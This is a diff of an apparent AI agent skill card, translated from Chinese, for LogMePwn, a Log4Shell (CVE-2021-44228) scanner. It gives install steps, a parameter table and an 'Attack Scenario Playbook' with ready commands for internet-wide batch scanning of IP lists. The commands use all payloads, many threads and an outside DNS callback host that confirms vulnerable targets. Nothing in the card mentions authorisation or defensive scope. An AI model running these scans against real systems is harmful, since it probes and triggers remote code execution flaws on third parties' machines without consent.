@@ -2,37 +2,40 @@
 name: logmepwn-log4j-mass
 description: "LogMePwn: Internet-wide batch Log4Shell scanning. Signals: vulnerability intelligence, CVE, Log4Shell batch, all payloads, threads."
 zh-signals: "LogMePwn: Log4Shell 全网批扫。信号:漏洞情报,cve,Log4Shell 批量,全 payload,线程。"
+when-to-use: >-
+  Use when scanning a large target list for Log4Shell (CVE-2021-44228) with a
+  DNS callback, using all payloads and configurable threads.
 ---
 
 # LogMePwn
 
-- 攻击大类:C06 漏洞情报与漏洞库
-- 上游仓库:https://github.com/0xInfection/LogMePwn
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C06 Vulnerability Intelligence and Exploit Databases
+- Upstream Repository: https://github.com/0xInfection/LogMePwn
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/0xInfection/LogMePwn && cd LogMePwn && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `lmp -targets urls.txt -callback x.dnslog.cn` | Log4Shell 批量 |
-| `-targets file -payload all` | 全 payload |
-| `-threads 50` | 线程 |
+| `lmp -targets urls.txt -callback x.dnslog.cn` | Log4Shell batch scan |
+| `-targets file -payload all` | All payloads |
+| `-threads 50` | Threads |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### Log4Shell 全网批扫
+### Internet-wide Log4Shell batch scan
 
 ```bash
 lmp -targets ips.txt -callback vps.dnslog.cn
-# 大规模 CVE-2021-44228
+# Large-scale CVE-2021-44228
 ```
 
-## 注意事项
+## Notes
 
-Log4Shell 批量扫描器,多协议支持。
+Batch Log4Shell scanner with multi-protocol support.
